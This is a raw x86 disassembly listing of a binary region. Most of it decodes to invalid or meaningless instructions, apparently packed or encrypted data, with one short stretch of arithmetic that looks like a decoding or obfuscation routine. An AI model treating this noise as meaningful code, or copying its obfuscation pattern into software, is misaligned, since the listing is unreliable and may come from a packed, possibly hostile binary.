  41f2ea:	(bad)  
  41f2eb:	repz mov ebp,0xf8f9f7e4
  41f2f1:	mov    ecx,0xfcfbeac4
  41f2f6:	fsubr  st,st(5)
  41f2f8:	loope  0x41f2d4
  41f2fa:	out    dx,eax
  41f2fb:	mov    edi,0xf606dcfa
  41f301:	fucomp st(7)
  41f303:	in     eax,0xec
  41f305:	or     eax,0xc5b8ca03
  41f30a:	mov    cl,0xac
  41f30c:	mov    ebp,0xb1fbb0c0
  41f311:	mov    dh,0xf3
  41f313:	rcr    esi,cl
  41f315:	repnz mov ch,0xd3
  41f318:	loop   0x41f316
  41f31a:	cld    
  41f31b:	ret    0x7
  41f31e:	loopne 0x41f2e7
  41f320:	retf   
  41f321:	vpaddd ymm5,ymm1,ymm3
  41f325:	wbinvd 
  41f327:	add    ecx,eax
  41f329:	in     eax,0xe6
  41f32b:	mov    al,0xe1
  41f32d:	loope  0x41f323
  41f32f:	imul   edx
  41f331:	int    0xbf
  41f333:	icebp  
  41f334:	icebp  
  41f335:	xlat   BYTE PTR ds:[ebx]
  41f336:	(bad)  
  41f338:	out    dx,al
  41f339:	(bad)  
  41f33a:	lock std 
  41f33c:	shl    bl,1
  41f33e:	add    al,bh
  41f340:	(bad)  
  41f341:	cmc    
  41f342:	iret   
  41f343:	retf   
  41f344:	add    al,0xca
  41f346:	or     bh,ch
  41f348:	in     al,dx
  41f349:	mov    cl,0xd0
  41f34b:	(bad)  
  41f34c:	hlt    
  41f34d:	out    0xcb,eax
  41f34f:	retf   0xc8f7
  41f352:	aad    0xde
  41f354:	call   0xda33af3d
  41f359:	(bad)  
  41f35b:	ffree  st(0)
  41f35d:	add    edi,esi
  41f35f:	push   es
  41f360:	clc    
  41f361:	fsubr  st(0),st
  41f363:	or     DWORD PTR [esi+edi*8],ecx
  41f366:	add    al,0x4
  41f368:	mov    cl,0xa8
  41f36a:	repz mov cl,0xe0
  41f36d:	iret   
  41f36e:	jecxz  0x41f359
  41f370:	(bad)  
  41f372:	mov    eax,0xbffbcacc
  41f377:	sar    BYTE PTR [eax+0x201f6d7],1
  41f37d:	stc    
  41f37e:	pop    es
  41f37f:	shl    dh,0xc5
  41f382:	retf   
  41f383:	or     edi,ecx
  41f385:	(bad)  
  41f386:	loopne 0x41f36b
  41f388:	into   
  41f389:	jmp    0xd9e0:0xeab5ade3
  41f390:	mov    dl,0xf8
  41f392:	mov    ebx,0xd8d9bbc6
  41f397:	retf   0xf1d1
  41f39a:	mov    esp,0xffc5edf2
  41f39f:	push   es
  41f3a0:	fnsetpm(287 only) 
  41f3a2:	cmc    
  41f3a3:	enter  0xf8e6,0x3
  41f3a7:	loop   0x41f391
  41f3a9:	repz jmp 0xc1e5:0xa9b3c8c6
  41f3b1:	out    0xcd,al
  41f3b3:	std    
  41f3b4:	rcr    ecx,1
  41f3b6:	fcmovnbe st,st(4)
  41f3b8:	jecxz  0x41f3b7
  41f3ba:	mov    esp,0xdeccf3ce
  41f3bf:	add    al,al
  41f3c1:	loope  0x41f398
  41f3c3:	(bad)  
  41f3c4:	fmul   st(4),st
  41f3c6:	adc    al,BYTE PTR [ebx]
  41f3c8:	mov    esi,0xb7b6e5c9
  41f3cd:	hlt    
  41f3ce:	loope  0x41f3ba
  41f3d0:	mov    ah,0xf9
  41f3d2:	lock in eax,dx
  41f3d4:	(bad)  
  41f3d5:	out    dx,eax
  41f3d6:	cli    
  41f3d7:	xlat   BYTE PTR ds:[ebx]
  41f3d8:	mov    esi,0xf403d5df
  41f3dd:	in     al,0xd6
  41f3df:	loopne 0x41f3ca
  41f3e1:	dec    eax
  41f3e3:	fcmove st,st(5)
  41f3e5:	out    dx,al
  41f3e6:	retf   0xcece
  41f3e9:	test   al,0xbc
  41f3eb:	mov    bl,0xdd
  41f3ed:	lock out 0xd5,eax
  41f3f0:	scas   eax,DWORD PTR es:[edi]
  41f3f1:	rcr    eax,1
  41f3f3:	lock stc 
  41f3f5:	std    
  41f3f6:	aam    0x1
  41f3f8:	cmc    
  41f3f9:	fiadd  WORD PTR [edi]
  41f3fb:	idiv   dl
  41f3fd:	aam    0xf4
  41f3ff:	cld    
  41f400:	add    al,0xf9
  41f402:	inc    DWORD PTR [edi]
  41f404:	fadd   DWORD PTR [eax]
  41f406:	stc    
  41f407:	cli    
  41f408:	fdivr  QWORD PTR [ebp-0xd0c4812]
  41f40e:	rcl    ch,cl
  41f410:	(bad)
  41f413:	in     eax,dx
  41f414:	mov    edi,0xd5d5ebfc
  41f419:	jecxz  0x41f40b
  41f41b:	rol    DWORD PTR [edx+esi*8],0xfc
  41f41f:	xlat   BYTE PTR ds:[ebx]
  41f420:	rol    BYTE PTR [eax+eiz*8],0xfb
  41f424:	loope  0x41f428
  41f426:	call   0xc0e8bc07
  41f42b:	mov    esp,0xd1f3c0ab
  41f430:	in     eax,dx
  41f431:	(bad)  
  41f432:	cli    
  41f433:	mov    dh,0xd5
  41f435:	mov    ebx,0xd4e1bff7
  41f43a:	add    BYTE PTR [eax+esi*8-0x2f282e2f],bh
  41f441:	add    dh,bh
  41f443:	loopne 0x41f42a
  41f445:	fisttp QWORD PTR [ebx+ecx*8]
  41f448:	in     al,0xe9
  41f44a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f44c:	in     al,dx
  41f44d:	repz ror esp,1
  41f450:	mov    bh,0xd4
  41f452:	int    0xf1
  41f454:	rcl    al,1
  41f456:	shr    bh,1
  41f458:	iret   
  41f459:	repz cld 
  41f45b:	cld    
  41f45c:	in     eax,dx
  41f45d:	lock xlat BYTE PTR ds:[ebx]
  41f45f:	pop    es
  41f460:	hlt    
  41f461:	out    0xf6,al
  41f463:	(bad)  
  41f464:	sti    
  41f465:	loope  0x41f450
  41f467:	pop    es
  41f468:	fdiv   st,st(7)
  41f46a:	int3   
  41f46b:	(bad)  
  41f46c:	out    0xb2,al
  41f46e:	int3   
  41f46f:	(bad)  
  41f470:	stc    
  41f471:	mov    cl,0xd8
  41f473:	cmc    
  41f474:	lock rcr esi,cl
  41f477:	(bad)  
  41f479:	add    edi,eax
  41f47b:	rcl    ah,1
  41f47d:	cld    
  41f47e:	shl    al,0xda
  41f481:	jmp    0x41f477
  41f483:	add    ch,al
  41f485:	or     cl,al
  41f487:	jmp    0xb3f6:0xc3d0ddd2
  41f48e:	(bad)  
  41f48f:	(bad)
  41f492:	(bad)  
  41f493:	shl    DWORD PTR [ebp-0x3d060634],1
  41f499:	hlt    
  41f49a:	(bad)  
  41f49c:	jmp    eax
  41f49e:	(bad)  [edx]
  41f4a0:	or     esp,eax
  41f4a2:	enter  0xcfed,0xc5
  41f4a6:	in     al,0xb
  41f4a8:	rcr    dh,cl
  41f4aa:	call   0xa9eeab7e
  41f4af:	aad    0xb2
  41f4b1:	rol    ebp,1
  41f4b3:	in     al,dx
  41f4b4:	out    dx,al
  41f4b5:	stc    
  41f4b6:	shl    BYTE PTR [edx+esi*8-0x5290c47],1
  41f4bd:	mov    esp,0xe8f6e4f7
  41f4c2:	loopne 0x41f48f
  41f4c4:	or     edi,edx
  41f4c6:	add    al,0x9
  41f4c8:	(bad)  
  41f4c9:	lock shr BYTE PTR [esi-0x4391f30],cl
  41f4d0:	loope  0x41f4a5
  41f4d2:	idiv   DWORD PTR [edi-0x2142fc0a]
  41f4d8:	mov    ecx,0xfabdbecc
  41f4dd:	clc    
  41f4de:	fimul  WORD PTR [ecx]
  41f4e0:	cld    
  41f4e1:	jmp    0xe4cb:0x3eafee0
  41f4e8:	(bad)  
  41f4e9:	lock ffree st(5)
  41f4ec:	in     eax,0xc9
  41f4ee:	loopne 0x41f4ea
  41f4f0:	aam    0xba
  41f4f2:	in     eax,dx
  41f4f3:	mov    ch,0xf3
  41f4f5:	sar    eax,cl
  41f4f7:	out    dx,eax
  41f4f8:	mov    eax,0xc5bcfcb9
  41f4fd:	rcr    ebx,cl
  41f4ff:	cli    
  41f500:	cld    
  41f501:	fincstp 
  41f503:	loop   0x41f4c8
  41f505:	fst    QWORD PTR [ebx]
  41f507:	adc    ah,ah
  41f509:	enter  0xaccd,0xb3
  41f50d:	div    DWORD PTR [edx-0x15243745]
  41f513:	int3   
  41f514:	hlt    
  41f515:	retf   
  41f516:	fcomi  st,st(3)
  41f518:	rcr    ecx,cl
  41f51a:	mov    DWORD PTR [esi],0xe3ebbdfb
  41f520:	dec    ecx
  41f522:	or     bh,dh
  41f524:	fsubr  st(6),st
  41f526:	fucomp st(2)
  41f528:	retf   0xaddd
  41f52b:	out    dx,al
  41f52c:	in     al,dx
  41f52d:	(bad)  
  41f52e:	cmc    
  41f52f:	hlt    
  41f530:	xlat   BYTE PTR ds:[ebx]
  41f531:	shl    DWORD PTR [esi-0x410c084b],cl
  41f537:	mov    eax,0xe5d800bb
  41f53c:	aad    0xf7
  41f53e:	inc    ch
  41f540:	(bad)  
  41f541:	fadd   DWORD PTR [eax]
  41f543:	fmul   st,st(6)
  41f545:	or     eax,0xd1ea1201
  41f54a:	call   0xfc34dd35
  41f54f:	xlat   BYTE PTR ds:[ebx]
  41f550:	shl    eax,cl
  41f552:	neg    bl
  41f554:	aam    0xfb
  41f556:	rcl    dl,cl
  41f558:	cli    
  41f559:	aad    0xdb
  41f55b:	fcomi  st,st(6)
  41f55d:	rol    ecx,cl
  41f55f:	(bad)  
  41f560:	jmp    0x6da:0xe3f8c0e3
  41f567:	out    0xbc,eax
  41f569:	jmp    0x41f529
  41f56b:	(bad)  
  41f56d:	in     al,0xe8
  41f56f:	jmp    0xbcfc:0xc6d6c6c5
  41f576:	mov    ecx,0xf0bacde2
  41f57b:	mov    eax,0xc3e7f3d9
  41f580:	push   es
  41f581:	jmp    0xc9e4:0xe3cac8c7
  41f588:	repnz (bad) 
  41f58a:	mov    al,0xd2
  41f58c:	lds    esi,FWORD PTR [ebp-0x4e0f1d3c]
  41f592:	lock call 0xf52ad074
  41f598:	mov    esp,0xe3f3f8db
  41f59d:	cli    
  41f59e:	stc    
  41f59f:	(bad)  
  41f5a0:	inc    DWORD PTR [ebx]
  41f5a2:	fisttp WORD PTR ds:0xfafbf3e0
  41f5a8:	(bad)  
  41f5a9:	iret   
  41f5aa:	lods   al,BYTE PTR ds:[esi]
  41f5ab:	rol    bh,1
  41f5ad:	in     al,0xea
  41f5af:	mov    al,0xf9
  41f5b1:	shl    cl,1
  41f5b3:	mov    esi,0xf2c8d9d0
  41f5b8:	aad    0xcf
  41f5ba:	jecxz  0x41f5b1
  41f5bc:	(bad)
  41f5bf:	ret    
  41f5c0:	add    eax,0xdee903f6
  41f5c5:	jmp    0xd7ae:0xa6b2eb0f
  41f5cc:	fnsave [ecx-0x3b080549]
  41f5d2:	in     eax,0xf8
  41f5d4:	out    dx,al
  41f5d5:	mov    esi,0xd0e0c2f9
  41f5da:	jecxz  0x41f5d3
  41f5dc:	fcmovbe st,st(6)
  41f5de:	sar    BYTE PTR [eax-0x6ff051b],0x8
  41f5e5:	or     BYTE PTR [edx],al
  41f5e7:	or     al,0xe5
  41f5e9:	call   0xaf32e4d1
  41f5ee:	out    dx,eax
  41f5ef:	lods   al,BYTE PTR ds:[esi]
  41f5f0:	shl    ah,0xba
  41f5f3:	int    0xe8
  41f5f5:	mov    ebx,0xdaf9fdeb
  41f5fa:	cli    
  41f5fb:	lock push es
  41f5fd:	fimul  DWORD PTR [edx]
  41f5ff:	out    0x4,al
  41f601:	out    dx,eax
  41f602:	or     bl,al
  41f604:	loope  0x41f610
  41f606:	or     ah,ch
  41f608:	stos   BYTE PTR es:[edi],al
  41f609:	mov    cl,0xd7
  41f60b:	enter  0xe5ca,0xcf
  41f60f:	aam    0xb0
  41f611:	retf   
  41f612:	xlat   BYTE PTR ds:[ebx]
  41f613:	mov    eax,0xf8fbf0d9
  41f618:	call   0xe505eee9
  41f61d:	repz or al,al
  41f620:	xlat   BYTE PTR ds:[ebx]
  41f621:	stc    
  41f622:	or     DWORD PTR [edx],eax
  41f624:	in     eax,0xc4
  41f626:	in     eax,dx
  41f627:	out    0xf0,al
  41f629:	out    0xe0,al
  41f62b:	ror    ah,0xb1
  41f62e:	lock out dx,al
  41f630:	mov    ecx,0xcad4f0b7
  41f635:	add    ebx,ecx
  41f637:	mov    al,0xbe
  41f639:	loop   0x41f5f3
  41f63b:	loopne 0x41f63a
  41f63d:	rol    BYTE PTR [edx],1
  41f63f:	retf   0xd00b
  41f642:	or     esp,eax
  41f644:	(bad)  
  41f645:	hlt    
  41f646:	repnz loopne 0x41f60f
  41f649:	stos   BYTE PTR es:[edi],al
  41f64a:	mov    edi,0xfae8e7dd
  41f64f:	neg    cl
  41f651:	(bad)  
  41f652:	mov    ebx,0xd7b9fdd2
  41f657:	(bad)  
  41f659:	out    0xdc,eax
  41f65b:	repnz add eax,0xd7d9c7c1
  41f661:	aam    0xd4
  41f663:	add    eax,0xe0d3d8fe
  41f668:	loope  0x41f634
  41f66a:	jecxz  0x41f63c
  41f66c:	scas   eax,DWORD PTR es:[edi]
  41f66d:	rcl    edi,0xc9
  41f670:	out    0xd8,eax
  41f672:	out    dx,eax
  41f673:	fdiv   DWORD PTR [ebx-0x2b200631]
  41f679:	fninit 
  41f67b:	cli    
  41f67c:	add    al,0xff
  41f67e:	add    cl,BYTE PTR [ebx]
  41f680:	out    0xca,al
  41f682:	fisttp QWORD PTR [ebx]
  41f684:	out    0xeb,al
  41f686:	cli    
  41f687:	call   0xc614da3d
  41f68c:	fst    st(1)
  41f68e:	(bad)  
  41f68f:	out    0xaf,al
  41f691:	aam    0xed
  41f693:	into   
  41f694:	cli    
  41f695:	shr    dl,1
  41f697:	add    ebx,esp
  41f699:	mov    dh,0xc3
  41f69b:	(bad)  
  41f69c:	ror    ah,1
  41f69e:	add    BYTE PTR [ecx],cl
  41f6a0:	call   0xc5fed8ac
  41f6a5:	call   0xe2150989
  41f6aa:	shl    BYTE PTR [ebp+ebp*4-0x442b144a],0xc0
  41f6b2:	(bad)
  41f6b5:	jecxz  0x41f6a7
  41f6b7:	out    dx,eax
  41f6b8:	int3   
  41f6b9:	ffree  st(7)
  41f6bb:	mov    eax,0xd8d2d3f0
  41f6c0:	leave  
  41f6c1:	leave  
  41f6c2:	add    ebx,ebp
  41f6c4:	pop    es
  41f6c5:	or     bl,bl
  41f6c7:	out    dx,eax
  41f6c8:	(bad)  
  41f6c9:	leave  
  41f6ca:	(bad)  
  41f6cb:	mov    dl,0xea
  41f6cd:	retf   
  41f6ce:	les    esi,FWORD PTR [edx-0x35211a2b]
  41f6d4:	std    
  41f6d5:	retf   
  41f6d6:	imul   ah
  41f6d8:	call   0xf516b6ca
  41f6dd:	les    edi,FWORD PTR [ecx-0xbf4180c]
  41f6e3:	enter  0xdeb,0xca
  41f6e7:	std    
  41f6e8:	call   0xe62bd99e
  41f6ed:	sti    
  41f6ee:	xlat   BYTE PTR ds:[ebx]
  41f6ef:	shl    BYTE PTR [eax-0x4608462e],1
  41f6f5:	fcmovnbe st,st(1)
  41f6f7:	aam    0xbd
  41f6f9:	fcmovbe st,st(0)
  41f6fb:	add    DWORD PTR [ebx],eax
  41f6fd:	stc    
  41f6fe:	(bad)  
  41f700:	jmp    0xede2:0xc7fac905
  41f707:	cld    
  41f708:	fnstsw WORD PTR [edi-0x521c1d2d]
  41f70e:	mov    ebx,0xb9fbcee9
  41f713:	rcl    dh,1
  41f715:	sti    
  41f716:	int    0xec
  41f718:	stc    
  41f719:	into   
  41f71a:	icebp  
  41f71b:	in     eax,0xd4
  41f71d:	cmc    
  41f71e:	lock (bad) 
  41f721:	xlat   BYTE PTR ds:[ebx]
  41f722:	in     eax,0xe4
  41f724:	std    
  41f725:	repz add eax,0xddf0c701
  41f72b:	ret    
  41f72c:	out    0xe2,eax
  41f72e:	test   eax,0xeff1c7fa
  41f733:	in     al,0xf7
  41f735:	int3   
  41f736:	xlat   BYTE PTR ds:[ebx]
  41f737:	mov    ecx,0xbec3c1fd
  41f73c:	rol    DWORD PTR [ecx],cl
  41f73e:	xlat   BYTE PTR ds:[ebx]
  41f73f:	fdecstp 
  41f741:	sti    
  41f742:	jmp    0xe923d648
  41f747:	leave  
  41f748:	jmp    0x41f6f3
  41f74a:	ret    0xb0f5
  41f74d:	out    dx,eax
  41f74e:	enter  0xc7f1,0xd7
  41f752:	iret   
  41f753:	shl    DWORD PTR [ecx+ebx*8-0x2f30fe41],cl
  41f75a:	fcmovu st,st(5)
  41f75c:	loop   0x41f730
  41f75e:	(bad)  
  41f75f:	loop   0x41f732
  41f761:	test   DWORD PTR [eax+ecx*1],0xea0fccc7
  41f768:	repz (bad) 
  41f76b:	mov    bh,0xac
  41f76d:	jmp    0xed35ce1e
  41f772:	mov    ebx,0xfcdbdae8
  41f777:	fucompp 
  41f779:	(bad)  
  41f77b:	fiadd  DWORD PTR [ebx]
  41f77d:	add    eax,0xc0e1c7d1
  41f782:	fstp   st(2)
  41f784:	cmc    
  41f785:	push   cs
  41f786:	jmp    0x41f777
  41f788:	test   eax,0xadd1bddd
  41f78d:	out    dx,al
  41f78e:	out    0xb3,al
  41f790:	in     al,dx
  41f791:	mov    ch,0xbb
  41f793:	(bad)  
  41f796:	mov    ch,0x2
  41f798:	mov    bh,0xcd
  41f79a:	fsubrp st(0),st
  41f79c:	in     eax,dx
  41f79d:	cli    
  41f79e:	(bad)  
  41f7a0:	loop   0x41f7a1
  41f7a2:	sar    dl,0xce
  41f7a5:	(bad)  
  41f7a6:	int3   
  41f7a7:	cli    
  41f7a8:	icebp  
  41f7a9:	lds    esi,FWORD PTR [edi-0x3e2d2d19]
  41f7af:	div    BYTE PTR [eax-0x170a3052]
  41f7b5:	iret   
  41f7b6:	hlt    
  41f7b7:	mov    edx,0xc0d7e8c1
  41f7bc:	mov    edi,0x7f4e0f6
  41f7c1:	add    ebx,esp
  41f7c3:	or     eax,0x11c5eef8
  41f7c8:	ret    
  41f7c9:	shr    bh,1
  41f7cb:	div    ecx
  41f7cd:	in     al,0xf0
  41f7cf:	hlt    
  41f7d0:	shl    eax,0xb8
  41f7d3:	into   
  41f7d4:	fcmove st,st(7)
  41f7d6:	neg    ebp
  41f7d8:	rcl    bh,1
  41f7da:	(bad)  
  41f7dc:	call   eax
  41f7de:	icebp  
  41f7df:	loopne 0x41f7cb
  41f7e1:	jmp    0x41f7a7
  41f7e3:	dec    ecx
  41f7e5:	jae    0x421c12
  41f7eb:	mov    eax,DWORD PTR [ebp-0x138]
  41f7f1:	sub    eax,0x3272fb
  41f7f6:	xor    eax,0x75108b5
  41f7fb:	add    eax,0x7f55d8f2
  41f800:	mov    ecx,DWORD PTR [ebp-0x138]
  41f806:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  41f80d:	mov    eax,DWORD PTR [ebp-0x138]
  41f813:	cmp    DWORD PTR [ebp+eax*4-0x130],0x244ecb9d
  41f81e:	jbe    0x421bee
  41f824:	jmp    0x421bca
  41f829:	retf   0x3386
  41f82c:	sub    esi,DWORD PTR [edi+0x2e]
  41f82f:	shl    BYTE PTR [esi+0x7c],cl
  41f832:	inc    esi
  41f834:	jnp    0x41f838
  41f836:	scas   al,BYTE PTR es:[edi]
  41f837:	xchg   BYTE PTR [esi+edx*8+0x23],bh
  41f83b:	jp     0x41f8b8
  41f83d:	add    bl,BYTE PTR [eax-0x30f28485]
  41f843:	into   
  41f844:	mov    ebp,0xd1aed2dc
  41f849:	shl    edi,1
  41f84b:	icebp  
  41f84c:	in     al,dx
  41f84d:	out    0xee,eax
  41f84f:	jmp    0xd3be:0xd503ddc9
  41f856:	aam    0xfc
  41f858:	int3   
  41f859:	mov    edx,0xe3d1c2f6
  41f85e:	(bad)  
  41f860:	cmc    
  41f861:	(bad)
  41f864:	mov    eax,0xebc6efcb
  41f869:	mov    bh,0xe7
  41f86b:	shr    ch,cl
  41f86d:	fnstenv [edi-0x35174b0e]
  41f873:	retf   0xddd4
  41f876:	out    0xd0,eax
  41f878:	(bad)  
  41f879:	(bad)  
  41f87a:	cli    
  41f87b:	mov    esp,0xfde9f5f1
  41f880:	out    0xfe,al
  41f882:	retf   0xede3
  41f885:	repz shl eax,1
  41f888:	repz enter 0xb6f6,0xf8
  41f88d:	cli    
  41f88e:	retf   0xd7ce
  41f891:	(bad)  
  41f892:	(bad)  
  41f894:	loop   0x41f871
  41f896:	int    0xd2
  41f898:	add    al,0xfb
  41f89a:	ret    
  41f89b:	fcomip st,st(4)
  41f89d:	out    0xee,eax
  41f89f:	idiv   dh
  41f8a1:	or     ecx,DWORD PTR [ecx]
  41f8a3:	add    al,0xd8
  41f8a5:	fmul   st(5),st
  41f8a7:	scas   eax,DWORD PTR es:[edi]
  41f8a8:	loop   0x41f8a1
  41f8aa:	xlat   BYTE PTR ds:[ebx]
  41f8ab:	out    dx,eax
  41f8ac:	retf   0xfad9
  41f8af:	fnstsw WORD PTR [ebp-0x3c16124c]
  41f8b5:	int3   
  41f8b6:	mov    ebx,0xdffcebf7
  41f8bc:	fsubp  st(2),st
  41f8be:	fdivp  st(7),st
  41f8c0:	clc    
  41f8c1:	or     eax,0xb1cbe0d8
  41f8c6:	(bad)  
  41f8c7:	(bad)  
  41f8c9:	icebp  
  41f8ca:	out    0xc1,al
  41f8cc:	in     al,0xb5
  41f8ce:	out    0xba,al
  41f8d0:	retf   
  41f8d1:	fmulp  st(7),st
  41f8d3:	int    0xd0
  41f8d5:	jecxz  0x41f899
  41f8d7:	mov    ah,0xd0
  41f8d9:	aam    0xb
  41f8db:	pop    es
  41f8dc:	mov    edi,0xddc9f8f4
  41f8e1:	pop    es
  41f8e2:	pop    es
  41f8e3:	int3   
  41f8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8e5:	scas   eax,DWORD PTR es:[edi]
  41f8e6:	(bad)  
  41f8e7:	leave  
  41f8e8:	mov    esp,0xc7acc9d7
  41f8ed:	shr    al,0xde
  41f8f0:	mov    ah,0xf4
  41f8f2:	icebp  
  41f8f3:	ret    
  41f8f4:	(bad)  
  41f8f5:	stc    
  41f8f6:	pop    es
  41f8f7:	out    0xc3,al
  41f8f9:	mov    esi,0x6e9fed2
  41f8fe:	add    ecx,DWORD PTR [eax]
  41f900:	(bad)  
  41f902:	std    
  41f903:	jmp    0xbcc2:0xa4e6e6e4
  41f90a:	ret    
  41f90b:	stc    
  41f90c:	mov    al,0xc9
  41f90e:	(bad)  
  41f90f:	mov    edx,0xcec9dcb9
  41f914:	shl    dl,cl
  41f916:	rol    DWORD PTR [edx],cl
  41f918:	(bad)  
  41f919:	fsubr  st(5),st
  41f91b:	in     al,0xe5
  41f91d:	loop   0x41f928
  41f91f:	(bad)  
  41f920:	std    
  41f921:	cli    
  41f922:	(bad)  
  41f923:	leave  
  41f924:	out    dx,eax
  41f925:	scas   eax,DWORD PTR es:[edi]
  41f926:	enter  0xb7ec,0xd2
  41f92a:	hlt    
  41f92b:	jmp    0xcfd3:0xeccbf0eb
  41f932:	aam    0xed
  41f934:	shl    edx,1
  41f936:	cli    
  41f937:	inc    bh
  41f939:	or     ebx,edi
  41f93b:	retf   0xe9de
  41f93e:	call   0xdf50f80b
  41f943:	(bad)  
  41f945:	ret    
  41f946:	ret    0xd2d3
  41f949:	loopne 0x41f931
  41f94b:	out    0xb2,eax
  41f94d:	jmp    0xf816ee44
  41f952:	cmc    
  41f953:	mov    edx,0xd507fbf2
  41f958:	div    esp
  41f95a:	ret    0xd6fd
  41f95d:	xlat   BYTE PTR ds:[ebx]
  41f95e:	stc    
  41f95f:	fucomp st(1)
  41f961:	cld    
  41f962:	std    
  41f963:	retf   0xefdc
  41f966:	mov    dl,0xe4
  41f968:	(bad)
  41f96b:	hlt    
  41f96c:	mov    al,0xfa
  41f96e:	shr    dl,cl
  41f970:	jmp    0xe401f64e
  41f975:	mov    esi,0xd005ded2
  41f97a:	sti    
  41f97b:	xlat   BYTE PTR ds:[ebx]
  41f97c:	aad    0xfb
  41f97e:	or     DWORD PTR [esi],ecx
  41f980:	out    dx,al
  41f981:	repz fsub st,st(5)
  41f984:	loope  0x41f945
  41f986:	mov    bl,0xd6
  41f988:	mov    cl,0xb4
  41f98a:	lods   al,BYTE PTR ds:[esi]
  41f98b:	jmp    0xf8d7:0xecc8dbe7
  41f992:	call   0xf443cb47
  41f997:	push   ebp
  41f999:	out    0xd3,eax
  41f99b:	(bad)  
  41f99d:	out    0xdb,al
  41f99f:	into   
  41f9a0:	in     al,dx
  41f9a1:	loopne 0x41f98b
  41f9a3:	add    BYTE PTR [edx-0xa2d2e10],ch
  41f9a9:	in     al,0xd4
  41f9ab:	mov    cl,0xb3
  41f9ad:	xlat   BYTE PTR ds:[ebx]
  41f9ae:	aam    0xd9
  41f9b0:	cli    
  41f9b1:	shl    DWORD PTR [ecx+0x6f5fbda],1
  41f9b7:	sar    bl,1
  41f9b9:	fcomip st,st(3)
  41f9bb:	(bad)  
  41f9bc:	loope  0x41f9c7
  41f9be:	or     ebx,edx
  41f9c0:	jmp    0x41f9b5
  41f9c2:	add    al,0xd3
  41f9c4:	(bad)  
  41f9c5:	not    edx
  41f9c7:	lds    esi,FWORD PTR [eax-0x2838300a]
  41f9cd:	(bad)
  41f9d0:	rol    DWORD PTR [ebx],1
  41f9d2:	(bad)  
  41f9d4:	fst    st(0)
  41f9d6:	repz push es
  41f9d8:	add    al,0xf7
  41f9da:	out    0xe4,al
  41f9dc:	xlat   BYTE PTR ds:[ebx]
  41f9dd:	in     eax,0xf7
  41f9df:	jmp    0x41f9ca
  41f9e1:	sti    
  41f9e2:	add    al,bl
  41f9e4:	int3   
  41f9e5:	lods   eax,DWORD PTR ds:[esi]
  41f9e6:	rol    edi,cl
  41f9e8:	retf   
  41f9e9:	jecxz  0x41f9dc
  41f9eb:	leave  
  41f9ec:	int    0xf3
  41f9ee:	idiv   ch
  41f9f0:	std    
  41f9f1:	sar    edi,1
  41f9f3:	int3   
  41f9f4:	aad    0xc2
  41f9f6:	(bad)  
  41f9f7:	test   esp,0xe4fcd9e3
  41f9fd:	(bad)  
  41f9ff:	loope  0x41f9e3
  41fa01:	(bad)  
  41fa02:	int    0x0
  41fa04:	scas   eax,DWORD PTR es:[edi]
  41fa05:	(bad)  
  41fa06:	shl    esp,1
  41fa08:	jmp    0xed0ccbff
  41fa0d:	scas   al,BYTE PTR es:[edi]
  41fa0e:	icebp  
  41fa0f:	hlt    
  41fa10:	(bad)  
  41fa12:	sar    DWORD PTR [ebx-0xf1c3029],1
  41fa18:	repz sti 
  41fa1a:	add    esi,esp
  41fa1c:	std    
  41fa1d:	fisttp DWORD PTR [ecx]
  41fa1f:	enter  0xa0b,0xca
  41fa23:	fsub   st(2),st
  41fa25:	icebp  
  41fa26:	(bad)  
  41fa27:	out    0xc4,al
  41fa29:	(bad)  
  41fa2a:	out    dx,al
  41fa2b:	fcmovb st,st(1)
  41fa2d:	(bad)  
  41fa2e:	aad    0xbb
  41fa30:	(bad)  
  41fa31:	out    dx,al
  41fa32:	cli    
  41fa33:	int    0xda
  41fa35:	fld    QWORD PTR [edx]
  41fa37:	shl    bh,0x4
  41fa3a:	neg    bl
  41fa3c:	in     al,0xdf
  41fa3e:	or     edi,edi
  41fa40:	fisttp WORD PTR [ebx+edx*8]
  41fa43:	leave  
  41fa44:	mov    ebp,0xe0b7c3f0
  41fa49:	jecxz  0x41fa06
  41fa4b:	out    0xce,al
  41fa4d:	repz fcmovnbe st,st(1)
  41fa50:	test   cl,0xf6
  41fa53:	push   esp
  41fa55:	loopne 0x41fa5d
  41fa57:	fild   WORD PTR [esi]
  41fa59:	repnz mov esp,0xf5d6c9d9
  41fa5f:	leave  
  41fa60:	out    0xc2,al
  41fa62:	int    0xea
  41fa64:	(bad)  
  41fa65:	into   
  41fa66:	mov    edi,0xc7caede0
  41fa6b:	mov    edx,0xacf7ced0
  41fa70:	sti    
  41fa71:	cld    
  41fa72:	jecxz  0x41fa46
  41fa74:	out    dx,al
  41fa75:	(bad)  
  41fa77:	loop   0x41fa53
  41fa79:	clc    
  41fa7a:	or     bl,cl
  41fa7c:	pop    es
  41fa7d:	call   0xd93cf860
  41fa82:	leave  
  41fa83:	add    dl,ah
  41fa85:	repz (bad) 
  41fa87:	int    0xc5
  41fa89:	mov    cl,0xcf
  41fa8b:	mov    dl,0xe7
  41fa8d:	in     al,dx
  41fa8e:	jmp    0xca0ee368
  41fa93:	stc    
  41fa94:	in     eax,dx
  41fa95:	add    dl,dh
  41fa97:	ret    
  41fa98:	loope  0x41fa86
  41fa9a:	stc    
  41fa9b:	pop    es
  41fa9c:	add    al,0x0
  41fa9e:	out    dx,eax
  41fa9f:	std    
  41faa0:	(bad)  
  41faa1:	fucom  st(1)
  41faa3:	cmpps  xmm6,XMMWORD PTR [eax-0x9225316],0xd2
  41faab:	mov    edx,0xeac5bae8
  41fab0:	(bad)  
  41fab2:	fidivr DWORD PTR [eax+ebp*8-0x6281c48]
  41fab9:	hlt    
  41faba:	ffreep st(4)
  41fabc:	ror    al,0xe8
  41fabf:	or     ebp,esp
  41fac1:	aam    0xfc
  41fac3:	adc    edi,eax
  41fac5:	(bad)  
  41fac6:	mov    cl,0xe2
  41fac8:	ret    
  41fac9:	out    dx,al
  41faca:	in     al,dx
  41facb:	shl    BYTE PTR [ecx-0x2b241729],0xf4
  41fad2:	jmp    0xff06:0xecf1dfba
  41fad9:	int3   
  41fada:	ret    0xe0fe
  41fadd:	(bad)  
  41fade:	cli    
  41fadf:	shl    al,0x8
  41fae2:	dec    DWORD PTR [ebx]
  41fae4:	in     eax,0xb0
  41fae6:	fmul   st(0),st
  41fae8:	repnz mov ah,0xe8
  41faec:	mov    cl,0xb4
  41faee:	cli    
  41faef:	repz stc 
  41faf1:	mov    ecx,0xd0fbcce3
  41faf6:	(bad)  
